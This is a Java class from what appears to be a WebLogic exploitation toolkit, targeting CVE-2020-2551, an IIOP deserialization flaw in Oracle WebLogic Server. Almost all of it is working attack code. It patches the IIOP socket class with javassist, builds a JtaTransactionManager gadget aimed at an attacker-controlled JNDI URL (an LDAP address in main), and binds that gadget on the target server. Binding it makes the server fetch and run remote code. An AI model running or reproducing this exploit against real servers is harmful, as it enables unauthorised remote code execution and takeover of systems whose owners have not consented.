package com.r4v3zn.weblogic.tools.payloads.impl;

import com.r4v3zn.weblogic.tools.annotation.Authors;
import com.r4v3zn.weblogic.tools.entity.MyException;
import com.r4v3zn.weblogic.tools.gadget.ObjectPayload;
import com.r4v3zn.weblogic.tools.gadget.impl.JtaTransactionManagerGadget;
import com.r4v3zn.weblogic.tools.payloads.VulTest;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtMethod;
import javassist.NotFoundException;

import javax.naming.Context;
import javax.naming.InitialContext;
import javax.naming.NamingException;
import java.io.Serializable;
import java.net.InetAddress;
import java.util.ArrayList;
import java.util.Hashtable;
import java.util.List;

/**
 * Title: CVE_2020_2551
 * Descrption:
 * <p>
 *     攻击者可以通过 IIOP 协议远程访问 Weblogic Server 服务器上的远程接口，传入恶意数据，从而获取服务器 权限并在未授权情况下远程执行任意代码。
 *     漏洞影响版本:
 *     Oracle WebLogic Server 10.3.6.0.0
 *     Oracle WebLogic Server 12.1.3.0.0
 *     Oracle WebLogic Server 12.2.1.3.0
 *     Oracle WebLogic Server 12.2.1.4.0
 *     github: https://github.com/0nise/CVE-2020-2551
 * </p>
 * Date:2020/3/23 23:05
 * Email:woo0nise@gmail.com
 * Company:www.j2ee.app
 * @author R4v3zn
 * @version 1.0.0
 */
@Authors({Authors.R4V3ZN})
public class CVE_2020_2551 implements VulTest {

    /**
     * 漏洞影响版本
     */
    public static final List<String> VUL_VERSIONS = new ArrayList<String>(){{
        add("10.3.6.0.0");
        add("12.1.3.0.0");
        add("12.2.1.3.0");
        add("12.2.1.4.0");
    }};

    /**
     * IIOP SOCKET Class name
     * "weblogic.socket.SocketMuxer";
     * "weblogic.iiop.MuxableSocketIIOP";
     */
    private static final String IIOP_SOCKET_CLASS_NAME= "weblogic.iiop.MuxableSocketIIOP";

    /**
     * 漏洞验证,漏洞存在返回 true 否则返回 false
     * @param ip ip
     * @param port 端口
     * @return 漏洞存在返回 true 否则返回 false
     */
    @Override
    public Boolean vulnerable(String ip, Integer port,String... param) throws Exception{
        try{
            loadClass(ip, port);
        }catch (Exception e){
            return false;
        }
        if(param.length == 0){
            throw new MyException("请输入JNDI URL");
        }
        String jndiUrl = param[0];
        Hashtable<String, String> env = new Hashtable<String, String>();
        env.put("java.naming.factory.initial", "weblogic.jndi.WLInitialContextFactory");
        env.put("java.naming.provider.url" , String.format("iiop://%s:%s", ip, port));
        Context context = null;
        try {
            context = new InitialContext(env);
        } catch (NamingException e) {
            return false;
        }
        JtaTransactionManagerGadget payload = new JtaTransactionManagerGadget();
        Object object = null;
        try {
            object = payload.getObject(jndiUrl);
        } catch (Exception e) {
            return false;
        }
        try{
            context.rebind("hello",object);
        }catch (Exception e){
            e.printStackTrace();
        }
        return null;
    }

    public void loadClass(String ip, Integer port) throws Exception {
        ClassPool cp = ClassPool.getDefault();
        CtClass ctClass = cp.get(IIOP_SOCKET_CLASS_NAME);
        String code = "{" +
                "$1 = java.net.InetAddress.getByName(\"" + ip + "\");\n" +
                "$2 = " + port + ";}";
        CtMethod ctMethod = ctClass.getDeclaredMethod("connect", new CtClass[]{cp.get(InetAddress.class.getName()), cp.get("int")});
        ctMethod.insertBefore(code);
        ctClass.toClass();
//        CtMethod ctMethod = ctClass.getDeclaredMethods("newSocket")[1];
//        ctMethod.setBody("{\n" +
//                "    java.net.InetAddress inet = java.net.InetAddress.getByName(\""+ip+"\");\n" +
//                "    $1 = inet;\n" +
//                "    java.net.Socket var4 = new java.net.Socket();\n" +
//                "    initSocket(var4);\n" +
//                "    var4.connect(new java.net.InetSocketAddress($1, $2), $3);\n" +
//                "    return var4;\n" +
//                "}");    }
    }

    /**
     * 漏洞利用
     * @param ip ip
     * @param port 端口
     * @throws Exception 抛出异常
     */
    @Override
    public void exploit(String ip, Integer port) throws Exception {
        // no
    }

    public static void main(String[] args) throws Exception {
        VulTest vul = new CVE_2020_2551();
        String jdnUrl = "ldap://192.168.1.6:1099/poc";
        vul.vulnerable("192.168.1.10", 7001,jdnUrl);
    }
}
